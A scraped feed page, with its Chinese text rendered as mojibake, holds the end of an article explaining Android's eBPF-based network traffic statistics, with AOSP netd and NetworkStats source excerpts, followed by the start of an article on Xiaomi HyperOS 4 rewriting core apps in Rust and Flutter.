<h4 data-id="heading-11"><strong>ä¼˜åŠ¿</strong></h4>
<ul>
<li>âœ… <strong>æ€§èƒ½æé«˜</strong>ï¼šå†…æ ¸æ€ç›´æ¥å¤„ç†ï¼Œæ— éœ€ä¸Šä¸‹æ–‡åˆ‡æ¢</li>
<li>âœ… <strong>å®æ—¶æ€§å¥½</strong>ï¼šæ¯ä¸ªæ•°æ®åŒ…éƒ½è¢«ç²¾ç¡®ç»Ÿè®¡</li>
<li>âœ… <strong>å¯æ‰©å±•æ€§å¼º</strong>ï¼šé€šè¿‡ Map è½»æ¾æ‰©å±•ç»Ÿè®¡ç»´åº¦</li>
</ul>
<h4 data-id="heading-12"><strong>æ ¸å¿ƒ eBPF ç¨‹åº</strong></h4>
<pre><code class="hljs language-493:525:packages_modules_Connectivity/bpf_progs/netd.c" lang="493:525:packages_modules_Connectivity/bpf_progs/netd.c">#define TAG_SYSTEM_DNS 0xFFFFFF82
    if (tag == TAG_SYSTEM_DNS &amp;&amp; uid == AID_DNS) {
        uid = sock_uid;
        if (match == DROP_UNLESS_DNS) match = PASS;
    } else {
        if (match == DROP_UNLESS_DNS) match = DROP;
    }

    // If an outbound packet is going to be dropped, we do not count that traffic.
    if (egress.egress &amp;&amp; (match == DROP)) return DROP;

    StatsKey key = {.uid = uid, .tag = tag, .counterSet = 0, .ifaceIndex = skb-&gt;ifindex};

    uint8_t* counterSet = bpf_uid_counterset_map_lookup_elem(&amp;uid);
    if (counterSet) key.counterSet = (uint32_t)*counterSet;

    uint32_t mapSettingKey = CURRENT_STATS_MAP_CONFIGURATION_KEY;
    uint32_t* selectedMap = bpf_configuration_map_lookup_elem(&amp;mapSettingKey);

    if (!selectedMap) return PASS;  // cannot happen, needed to keep bpf verifier happy

    do_packet_tracing(skb, egress, uid, tag, enable_tracing, kver);
    update_stats_with_config(*selectedMap, skb, &amp;key, egress, kver);
    update_app_uid_stats_map(skb, &amp;uid, egress, kver);

    // We've already handled DROP_UNLESS_DNS up above, thus when we reach here the only
    // possible values of match are DROP(0) or PASS(1), however we need to use
    // "match &amp;= 1" before 'return match' to help the kernel's bpf verifier,
    // so that it can be 100% certain that the returned value is always 0 or 1.
    // We use assembly so that it cannot be optimized out by a too smart compiler.
    asm("%0 &amp;= 1" : "+r"(match));
    return match;
}
</code></pre>
<h4 data-id="heading-13"><strong>eBPF Maps ç»“æ„</strong></h4>
<pre><code class="hljs language-103:129:packages_modules_Connectivity/bpf_progs/netd.h" lang="103:129:packages_modules_Connectivity/bpf_progs/netd.h">// app_uid_stats_map:   key:  4 bytes, value: 32 bytes, cost: 1062784 bytes    =  1063Kbytes
// uid_stats_map:       key: 16 bytes, value: 32 bytes, cost: 1142848 bytes    =  1143Kbytes
// tag_stats_map:       key: 16 bytes, value: 32 bytes, cost: 1142848 bytes    =  1143Kbytes
// iface_index_name_map:key:  4 bytes, value: 16 bytes, cost:   80896 bytes    =    81Kbytes
// iface_stats_map:     key:  4 bytes, value: 32 bytes, cost:   97024 bytes    =    97Kbytes
// dozable_uid_map:     key:  4 bytes, value:  1 bytes, cost:  145216 bytes    =   145Kbytes
// standby_uid_map:     key:  4 bytes, value:  1 bytes, cost:  145216 bytes    =   145Kbytes
// powersave_uid_map:   key:  4 bytes, value:  1 bytes, cost:  145216 bytes    =   145Kbytes
// packet_trace_ringbuf:key:  0 bytes, value: 24 bytes, cost:   32768 bytes    =    32Kbytes
// total:                                                                         4962Kbytes
// It takes maximum 4.9MB kernel memory space if all maps are full, which requires any devices
// running this module to have a memlock rlimit to be larger then 5MB. In the old qtaguid module,
// we don't have a total limit for data entries but only have limitation of tags each uid can have.
// (default is 1024 in kernel);

// 'static' - otherwise these constants end up in .rodata in the resulting .o post compilation
static const int COOKIE_UID_MAP_SIZE = 10000;
static const int UID_COUNTERSET_MAP_SIZE = 4000;
static const int APP_STATS_MAP_SIZE = 10000;
static const int STATS_MAP_SIZE = 5000;
static const int IFACE_INDEX_NAME_MAP_SIZE = 1000;
static const int IFACE_STATS_MAP_SIZE = 1000;
static const int CONFIGURATION_MAP_SIZE = 2;
static const int UID_OWNER_MAP_SIZE = 4000;
static const int INGRESS_DISCARD_MAP_SIZE = 100;
static const int PACKET_TRACE_BUF_SIZE = 32 * 1024;
static const int DATA_SAVER_ENABLED_MAP_SIZE = 1;
</code></pre>
<p><strong>å…³é”® Maps</strong>ï¼š</p>
<ul>
<li>ğŸ”‘ <strong>cookie_tag_map</strong>ï¼šSocket Cookie â†’ (UID, Tag) æ˜ å°„</li>
<li>ğŸ“Š <strong>uid_stats_map</strong>ï¼šUID æµé‡ç»Ÿè®¡ï¼ˆRX/TX Bytes &amp; Packetsï¼‰</li>
<li>ğŸ·ï¸ <strong>tag_stats_map</strong>ï¼šTag æµé‡ç»Ÿè®¡ï¼ˆç”¨äº Socket Taggingï¼‰</li>
<li>ğŸŒ <strong>iface_stats_map</strong>ï¼šç½‘å¡æ¥å£æµé‡ç»Ÿè®¡</li>
</ul>
<h3 data-id="heading-14"><strong>xt_qtaguidï¼ˆè€æ—§è®¾å¤‡ï¼‰</strong></h3>
<p><strong>æ–‡ä»¶è·¯å¾„</strong>ï¼š<code>/proc/net/xt_qtaguid/stats</code></p>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>âŒ æ€§èƒ½è¾ƒå·®ï¼ˆNetfilter é’©å­å¼€é”€å¤§ï¼‰</li>
<li>âŒ æ— æ³•ç²¾ç¡®ç»Ÿè®¡æŸäº›åœºæ™¯ï¼ˆå¦‚ eBPF offloadï¼‰</li>
<li>âŒ å·²åœ¨ Android 9+ åºŸå¼ƒ</li>
</ul>
<hr/>
<h2 data-id="heading-15">4ï¸âƒ£ <strong>ç‰¹æ®Šæœºåˆ¶ï¼šSocket Tagging</strong></h2>
<h3 data-id="heading-16"><strong>ä»€ä¹ˆæ˜¯ Socket Taggingï¼Ÿ</strong></h3>
<p>å…è®¸åº”ç”¨ä¸º Socket æ‰“ä¸Šè‡ªå®šä¹‰æ ‡ç­¾ï¼ˆTagï¼‰ï¼Œå®ç°<strong>æ›´ç»†ç²’åº¦çš„æµé‡ç»Ÿè®¡</strong>ã€‚</p>
<h3 data-id="heading-17"><strong>ä½¿ç”¨åœºæ™¯</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åœ¨å‘èµ·ç½‘ç»œè¯·æ±‚å‰</span>
TrafficStats.setThreadStatsTag(<span class="hljs-number">0xDEADBEEF</span>); <span class="hljs-comment">// è®¾ç½® Tag</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();
    <span class="hljs-comment">// è¿™ä¸ªè¿æ¥çš„æµé‡ä¼šè¢«ç»Ÿè®¡åˆ° Tag 0xDEADBEEF</span>
} <span class="hljs-keyword">finally</span> {
    TrafficStats.clearThreadStatsTag(); <span class="hljs-comment">// æ¸…é™¤ Tag</span>
}
</code></pre>
<p><strong>å®é™…åº”ç”¨</strong>ï¼š</p>
<ul>
<li>ğŸ“± <strong>å¤šè´¦å· App</strong>ï¼šåŒºåˆ†ä¸åŒè´¦å·çš„æµé‡</li>
<li>ğŸ® <strong>æ¸¸æˆ App</strong>ï¼šåŒºåˆ†æ¸¸æˆå†…ä¸åŒåŠŸèƒ½çš„æµé‡ï¼ˆèŠå¤© vs æˆ˜æ–—ï¼‰</li>
<li>ğŸ“º <strong>è§†é¢‘ App</strong>ï¼šåŒºåˆ†è§†é¢‘æµé‡ vs å¹¿å‘Šæµé‡</li>
</ul>
<h3 data-id="heading-18"><strong>å†…æ ¸å®ç°</strong></h3>
<pre><code class="hljs language-37:53:packages_modules_Connectivity/netd/BpfHandler.h" lang="37:53:packages_modules_Connectivity/netd/BpfHandler.h">     * Tag the socket with the specified tag and uid. In the qtaguid module, the
     * first tag request that grab the spinlock of rb_tree can update the tag
     * information first and other request need to wait until it finish. All the
     * tag request will be addressed in the order of they obtaining the spinlock.
     * In the eBPF implementation, the kernel will try to update the eBPF map
     * entry with the tag request. And the hashmap update process is protected by
     * the spinlock initialized with the map. So the behavior of two modules
     * should be the same. No additional lock needed.
     */
    int tagSocket(int sockFd, uint32_t tag, uid_t chargeUid, uid_t realUid);

    /*
     * The untag process is similar to tag socket and both old qtaguid module and
     * new eBPF module have spinlock inside the kernel for concurrent update. No
     * external lock is required.
     */
    int untagSocket(int sockFd);
</code></pre>
<hr/>
<h2 data-id="heading-19">5ï¸âƒ£ <strong>464xlat æµé‡æ ¡æ­£</strong></h2>
<h3 data-id="heading-20"><strong>é—®é¢˜èƒŒæ™¯</strong></h3>
<p>åœ¨ IPv4-only App é€šè¿‡ 464xlat ä½¿ç”¨ IPv6-only ç½‘ç»œæ—¶ï¼Œä¼šå‡ºç°æµé‡ç»Ÿè®¡åå·®ï¼š</p>
<ul>
<li><strong>IPv4 åŒ…å¤´</strong>ï¼š20 å­—èŠ‚</li>
<li><strong>IPv6 åŒ…å¤´</strong>ï¼š40 å­—èŠ‚</li>
<li><strong>å·®å¼‚</strong>ï¼šæ¯ä¸ªåŒ…å¤š 20 å­—èŠ‚</li>
</ul>
<h3 data-id="heading-21"><strong>æ ¡æ­£æœºåˆ¶</strong></h3>
<pre><code class="hljs language-1181:1230:packages_modules_Connectivity/framework-t/src/android/net/NetworkStats.java" lang="1181:1230:packages_modules_Connectivity/framework-t/src/android/net/NetworkStats.java">    /**
     * Calculate and apply adjustments to captured statistics for 464xlat traffic.
     *
     * &lt;p&gt;This mutates stacked traffic stats, to account for IPv4/IPv6 header size difference.
     *
     * &lt;p&gt;UID stats, which are only accounted on the stacked interface, need to be increased
     * by 20 bytes/packet to account for translation overhead.
     *
     * &lt;p&gt;The potential additional overhead of 8 bytes/packet for ip fragments is ignored.
     *
     * &lt;p&gt;Interface stats need to sum traffic on both stacked and base interface because:
     *   - eBPF offloaded packets appear only on the stacked interface
     *   - Non-offloaded ingress packets appear only on the stacked interface
     *     (due to iptables raw PREROUTING drop rules)
     *   - Non-offloaded egress packets appear only on the stacked interface
     *     (due to ignoring traffic from clat daemon by uid match)
     * (and of course the 20 bytes/packet overhead needs to be applied to stacked interface stats)
     *
     * &lt;p&gt;This method will behave fine if {@code stackedIfaces} is an non-synchronized but add-only
     * {@code ConcurrentHashMap}
     * @param baseTraffic Traffic on the base interfaces. Will be mutated.
     * @param stackedTraffic Stats with traffic stacked on top of our ifaces. Will also be mutated.
     * @param stackedIfaces Mapping ipv6if -&gt; ipv4if interface where traffic is counted on both.
     * @hide
     */
    public static void apply464xlatAdjustments(NetworkStats baseTraffic,
            NetworkStats stackedTraffic, Map&lt;String, String&gt; stackedIfaces) {
        // For recycling
        Entry entry = null;
        for (int i = 0; i &lt; stackedTraffic.size; i++) {
            entry = stackedTraffic.getValues(i, entry);
            if (entry == null) continue;
            if (entry.iface == null) continue;
            if (!entry.iface.startsWith(CLATD_INTERFACE_PREFIX)) continue;

            // For 464xlat traffic, per uid stats only counts the bytes of the native IPv4 packet
            // sent on the stacked interface with prefix "v4-" and drops the IPv6 header size after
            // unwrapping. To account correctly for on-the-wire traffic, add the 20 additional bytes
            // difference for all packets (http://b/12249687, http:/b/33681750).
            //
            // Note: this doesn't account for LRO/GRO/GSO/TSO (ie. &gt;mtu) traffic correctly, nor
            // does it correctly account for the 8 extra bytes in the IPv6 fragmentation header.
            //
            // While the ebpf code path does try to simulate proper post segmentation packet
            // counts, we have nothing of the sort of xt_qtaguid stats.
            entry.rxBytes += entry.rxPackets * IPV4V6_HEADER_DELTA;
            entry.txBytes += entry.txPackets * IPV4V6_HEADER_DELTA;
            stackedTraffic.setValues(i, entry);
        }
    }
</code></pre>
<hr/>
<h2 data-id="heading-22">ğŸ“ˆ <strong>ç»Ÿè®¡ç»´åº¦æ€»ç»“</strong></h2>








































<table><thead><tr><th>ç»´åº¦</th><th>è¯´æ˜</th><th>API</th></tr></thead><tbody><tr><td><strong>UID</strong></td><td>æŒ‰åº”ç”¨ç¨‹åºç»Ÿè®¡</td><td><code>TrafficStats.getUidTxBytes(uid)</code></td></tr><tr><td><strong>Tag</strong></td><td>æŒ‰ Socket æ ‡ç­¾ç»Ÿè®¡</td><td><code>TrafficStats.setThreadStatsTag()</code></td></tr><tr><td><strong>Interface</strong></td><td>æŒ‰ç½‘å¡æ¥å£ç»Ÿè®¡ï¼ˆrmnet0, wlan0 ç­‰ï¼‰</td><td><code>TrafficStats.getTxBytes(iface)</code></td></tr><tr><td><strong>Set</strong></td><td>å‰å°/åå°æµé‡åˆ†ç¦»</td><td><code>NetworkStats.SET_FOREGROUND</code></td></tr><tr><td><strong>Network</strong></td><td>æŒ‰ç½‘ç»œç±»å‹ï¼ˆWiFi, ç§»åŠ¨æ•°æ®ï¼‰</td><td><code>NetworkStatsManager.queryDetails()</code></td></tr><tr><td><strong>Time</strong></td><td>æŒ‰æ—¶é—´æ®µæŸ¥è¯¢å†å²æ•°æ®</td><td><code>NetworkStatsManager</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-23">ğŸ¯ <strong>å®æˆ˜åœºæ™¯</strong></h2>
<h3 data-id="heading-24">1. <strong>æ•°æ®ç”¨é‡ç›‘æ§ App</strong></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">NetworkStatsManager</span> <span class="hljs-variable">statsManager</span> <span class="hljs-operator">=</span> context.getSystemService(NetworkStatsManager.class);
<span class="hljs-type">NetworkStats</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> statsManager.queryDetails(
    ConnectivityManager.TYPE_MOBILE, 
    subscriberId,
    startTime, 
    endTime
);
</code></pre>
<h3 data-id="heading-25">2. <strong>é˜²ç«å¢™ Appï¼ˆé™åˆ¶åå°æµé‡ï¼‰</strong></h3>
<p>é€šè¿‡è®¾ç½® <code>uid_counterset_map</code>ï¼Œå°† UID æ ‡è®°ä¸º <code>SET_DEFAULT</code> æˆ– <code>SET_FOREGROUND</code>ã€‚</p>
<h3 data-id="heading-26">3. <strong>æµé‡ç»Ÿè®¡ Widget</strong></h3>
<p>å®æ—¶æ˜¾ç¤ºå½“å‰ App çš„ä¸Šä¼ /ä¸‹è½½é€Ÿåº¦ã€‚</p>
<hr/>
<h2 data-id="heading-27">âš¡ <strong>æ€§èƒ½ä¼˜åŒ–</strong></h2>
<ol>
<li><strong>eBPF Zero-Copy</strong>ï¼šå†…æ ¸æ€æ•°æ®ç›´æ¥æ˜ å°„åˆ°ç”¨æˆ·æ€ï¼Œæ— éœ€æ‹·è´</li>
<li><strong>åŒç¼“å†²æœºåˆ¶</strong>ï¼šè¯»å†™åˆ†ç¦»çš„ Stats Mapï¼ˆMap A / Map Bï¼‰</li>
<li><strong>ç¼“å­˜æœºåˆ¶</strong>ï¼šTrafficStats ç»“æœç¼“å­˜ 1 ç§’ï¼Œé¿å…é¢‘ç¹ IPC</li>
<li><strong>å¢é‡æ›´æ–°</strong>ï¼šåªè®°å½•å˜åŒ–é‡ï¼Œå‡å°‘å­˜å‚¨ç©ºé—´</li>
</ol>
<hr/>
<p>å¸Œæœ›è¿™ä»½è¯¦å°½çš„è§£æå¸®åŠ©æ‚¨æ·±å…¥ç†è§£äº† Android ç½‘ç»œæµé‡ç»Ÿè®¡çš„å®Œæ•´æ¶æ„ï¼ä»å†…æ ¸ eBPF åˆ°åº”ç”¨å±‚ APIï¼ŒAndroid æ„å»ºäº†ä¸€å¥—é«˜æ•ˆã€å‡†ç¡®ã€çµæ´»çš„æµé‡ç›‘æ§ä½“ç³»ã€‚å¦‚æœæ‚¨æƒ³æ·±å…¥ç ”ç©¶æŸä¸ªå…·ä½“éƒ¨åˆ†ï¼ˆå¦‚ eBPF ç¨‹åºç¼–å†™ã€NetworkStatsService çš„æŒä¹…åŒ–æœºåˆ¶ã€æˆ–æµé‡å‘Šè­¦çš„å®ç°ï¼‰ï¼Œéšæ—¶å‘Šè¯‰æˆ‘ï¼ğŸ“ŠğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å°ç±³ HyperOS 4 å¤§å˜æ ·ï¼Ÿæ ¸å¿ƒåº”ç”¨ä»¥ Rust / Flutter é‡å†™ï¼Œä¸å…¼å®¹è€ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7602512064977207359</link>    <guid>https://juejin.cn/post/7602512064977207359</guid>    <pubDate>2026-02-04T04:29:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602512064977207359" data-draft-id="7602512064977190975" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å°ç±³ HyperOS 4 å¤§å˜æ ·ï¼Ÿæ ¸å¿ƒåº”ç”¨ä»¥ Rust / Flutter é‡å†™ï¼Œä¸å…¼å®¹è€ç³»ç»Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,Flutter,Android"/> <meta itemprop="datePublished" content="2026-02-04T04:29:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‹çŒ«deå°éƒ­"/> <meta itemprop="url" content="https://juejin.cn/user/817692379985752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å°ç±³ HyperOS 4 å¤§å˜æ ·ï¼Ÿæ ¸å¿ƒåº”ç”¨ä»¥ Rust / Flutter é‡å†™ï¼Œä¸å…¼å®¹è€ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/817692379985752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‹çŒ«deå°éƒ­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T04:29:58.000Z" title="Wed Feb 04 2026 04:29:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    480
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä»Šæ—¥ï¼Œxiaomi time å‘å¸ƒäº†ç›¸å…³è¡¨ç¤ºï¼Œ<strong>HyperOS 4 å°†æ˜¯å°ç±³å†å²ä¸Šæœ€ç¨³å®šçš„æ›´æ–°</strong>ï¼Œå½“ç„¶è¿™ä¸æ˜¯é‡ç‚¹ï¼Œé‡ç‚¹æ˜¯æ ¹æ®è¿‘æœŸ HyperOS 3.1 ç‰ˆæœ¬ï¼Œå¯ä»¥çœ‹åˆ°å¯¹åº”çš„åº”ç”¨æ¶æ„å‡ºç°äº†å˜åŒ–ï¼Œå°ç±³æ­£åœ¨åˆ†é˜¶æ®µå¼ƒç”¨å¯¹åº”çš„æ—§ç‰ˆä»£ç æ¶æ„ï¼Œä¾‹å¦‚ï¼š</p>
<blockquote>
<p>HyperOS 3.1 å¼€å§‹ç§»é™¤éƒ¨åˆ†ç³»ç»Ÿæ¨¡å—ï¼ˆç‰¹åˆ«æ˜¯å¤©æ°”å’Œå›¾åº“ï¼‰ä¸­çš„ <code>MIUI SDK</code> ã€‚</p>
</blockquote>
<p>ä»¥ HyperOS 3.1 ä½œä¸ºè¿‡æ¸¡ç‰ˆæœ¬ï¼Œé€šè¿‡å¼•å…¥äº†åŸç”Ÿ <code>HyperOS SDK</code> ä»¥åŠå·²å¼ƒç”¨çš„ <code>MIUI SDK</code> ï¼Œæœªæ¥ HyperOS 4 é¢„è®¡å°†é€šè¿‡å½»åº•ç§»é™¤å‘åå…¼å®¹å±‚æ¥å®Œæˆè¿™ä¸€è¿ç§»ã€‚</p>
<blockquote>
<p>è¿™ä¸€è½¬å˜é¢„è®¡å¯ä»¥æ¶ˆé™¤åå¤šå¹´æ¥å†—ä½™çš„å‡½æ•°è°ƒç”¨å’Œæœªä¼˜åŒ–çš„ä¾èµ–é“¾ã€‚</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82cc8a0de3c1486b83044c083eb3c34c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770796677&amp;x-signature=bIUVpKYH8pmBQDYnRgkVJbn9tWc%3D" alt="image-20260204121849635" loading="lazy"/></p>
<p>å½“ç„¶ï¼Œæœ€æœ‰æ„æ€çš„è¿˜æ˜¯ï¼Œé’ˆå¯¹ç³»ç»Ÿæ ¸å¿ƒåº”ç”¨ï¼Œ<strong>HyperOS å·²ç»åœ¨ä½¿ç”¨ Flutter å’Œ Rust é‡å†™ï¼Œç›®å‰å·²åœ¨ HyperOS 3.1 ä¸­è¿›è¡Œè¯•ç‚¹</strong> ï¼ŒæŒ‰ç…§å®ƒçš„è¯´æ³•ï¼š</p>
<blockquote>
